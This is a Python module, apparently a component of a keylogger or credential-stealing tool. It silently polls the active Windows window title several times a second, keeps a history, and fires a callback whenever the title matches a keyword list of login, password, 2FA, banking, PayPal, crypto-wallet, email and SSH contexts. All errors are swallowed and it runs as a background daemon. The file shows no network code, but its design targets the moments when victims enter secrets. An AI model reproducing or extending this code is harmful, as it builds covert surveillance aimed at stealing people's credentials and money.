import threading
import time
import re
from datetime import datetime
from collections import deque

try:
    import ctypes
    from ctypes import wintypes
    CTYPES_AVAILABLE = True
except ImportError:
    CTYPES_AVAILABLE = False


LOGIN_KEYWORDS = [
    "log in", "login", "sign in", "signin", "sign-in",
    "password", "passwd", "credentials", "authenticate",
    "account", "unlock", "security", "verification",
    "two-factor", "2fa", "otp", "pin code",
    "facebook", "google", "twitter", "instagram",
    "gmail", "outlook", "yahoo", "hotmail",
    "github", "gitlab", "bitbucket",
    "paypal", "bank", "banking",
    "amazon", "netflix", "spotify",
    "discord", "slack", "teams",
    "ssh", "ftp", "vpn", "remote desktop",
    "wallet", "crypto",
]


class WindowTracker:

    def __init__(self):
        self._running = False
        self._thread = None
        self._current_window = ""
        self._current_process = ""
        self._is_login_context = False
        self._window_history = deque(maxlen=100)
        self._lock = threading.Lock()

        self._on_window_change = None
        self._on_login_detected = None

    def set_window_change_callback(self, callback):
        self._on_window_change = callback

    def set_login_detected_callback(self, callback):
        self._on_login_detected = callback

    def start(self):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(
            target=self._track_loop,
            name="WindowTracker",
            daemon=True,
        )
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)

    def _track_loop(self):
        while self._running:
            try:
                new_title = self._get_active_window_title()
                if new_title and new_title != self._current_window:
                    old_window = self._current_window
                    with self._lock:
                        self._current_window = new_title
                        self._is_login_context = self._detect_login_context(new_title)

                    self._window_history.append({
                        "title": new_title,
                        "timestamp": datetime.now().isoformat(),
                        "is_login": self._is_login_context,
                    })

                    if self._on_window_change:
                        try:
                            self._on_window_change(old_window, new_title)
                        except Exception:
                            pass

                    if self._is_login_context and self._on_login_detected:
                        try:
                            self._on_login_detected(new_title)
                        except Exception:
                            pass

            except Exception:
                pass

            time.sleep(0.3)

    @staticmethod
    def _get_active_window_title() -> str:
        if not CTYPES_AVAILABLE:
            return "Unknown Window"

        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            if length == 0:
                return ""
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return ""

    @staticmethod
    def _detect_login_context(window_title: str) -> bool:
        title_lower = window_title.lower()
        return any(keyword in title_lower for keyword in LOGIN_KEYWORDS)

    @property
    def current_window(self) -> str:
        with self._lock:
            return self._current_window

    @property
    def is_login_context(self) -> bool:
        with self._lock:
            return self._is_login_context

    def get_window_history(self, count: int = 20) -> list:
        return list(self._window_history)[-count:]

    def get_stats(self) -> dict:
        return {
            "running": self._running,
            "current_window": self._current_window,
            "is_login_context": self._is_login_context,
            "history_count": len(self._window_history),
        }

    @property
    def is_running(self) -> bool:
        return self._running
